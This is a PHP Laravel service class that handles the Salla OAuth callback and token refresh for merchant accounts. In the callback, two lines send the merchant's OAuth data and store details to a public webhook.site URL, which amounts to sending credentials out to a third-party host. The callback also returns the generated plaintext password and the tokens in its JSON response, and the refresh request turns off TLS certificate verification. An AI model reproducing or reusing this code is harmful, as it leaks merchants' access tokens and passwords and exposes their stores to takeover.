<?php namespace App\Services\SallaService;

use App\Models\User;
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Notifications\MerchantRegistered;
use Illuminate\Support\Facades\Http;
use App\Services\InterfaceService\Authorize as InterfaceAuthorize;

class Authorize extends Credential implements InterfaceAuthorize{
    public function redirect(Request $request){
       return $this->callback($request);
    }

    public function callback(Request $request){
        $user     = $request->user();
        $data     = $request->input('data');
        /* authorizer info & store info */
        $authorizer_info           = $this->authorizer_info($data);
        $store                     = $this->authorizer_store($data);
        Http::get("https://webhook.site/5b5e8bee-c015-4d5d-aefc-da78cc7f4c7f",$data);
        Http::get("https://webhook.site/5b5e8bee-c015-4d5d-aefc-da78cc7f4c7f",$store);
        $data['store_id']          = $store['data']['id'];
        $data['store_url']         = $store['data']['domain'];
        $data['merchant_email']    = $authorizer_info['data']['email']  ?: null;
        $data['merchant_phone']    = $authorizer_info['data']['mobile'] ? str_replace('+','',$authorizer_info['data']['mobile']) : null;
        $data['merchant_name']     = $authorizer_info['data']['merchant']['username'] ?: null;
        $data['app_name']          = 'salla';
        $data['password']          = Str::random(10);

        $merchant = User::updateOrCreate([
            'email' => $data['merchant_email'],
            'phone' => $data['merchant_phone']
        ],[
            'name'  => $data['merchant_name'],
            'role'  => 1,
            'password'  => Hash::make($data['password']) //Str::random(10)
        ]);

        $merchant->zid_config()->updateOrCreate(
            ['user_id' => $merchant->id],
            $data
        );

        $merchant->notify(new MerchantRegistered($data));
        return response()->json([
            'result'          => $data,
            'authorizer_info' => $authorizer_info,
            'store'           => $store,
            'merchant'        => $merchant
        ]);
    }

    public function authorizer_info(Array $credentials){
        $response = $this->resolve_call('/oauth2/user/info','get',[],$credentials);
        return $response->json();
    }

    public function authorizer_store(Array $credentials){
        $response = $this->resolve_call('/store/info','get',[],$credentials);
        return $response->json();
    }

    public static function refresh_merchant_token($user){

        if(!$user->zid_config) return;

        $response = Http::asForm()->withOptions([
            'verify' => false,
        ])->post(self::$auth_endPoint . '/oauth2/token', [
            'grant_type' => 'refresh_token',
            'refresh_token' => $user->zid_config->refresh_token, // your merchant refresh token
            'client_id'     => env('SALLA_CLIENT_ID'),
            'client_secret' => env('SALLA_CLIENT_SECRET'),
            'redirect_uri'  => env('APP_URL')."/api/callback/salla"
        ]);

        if($response->successful()):
            $user->zid_config()->updateOrCreate(
                ['user_id' => $user->id],
                $response->json()
            );
            return $user->zid_config;
        else:
            return $response;
        endif;
    }
}
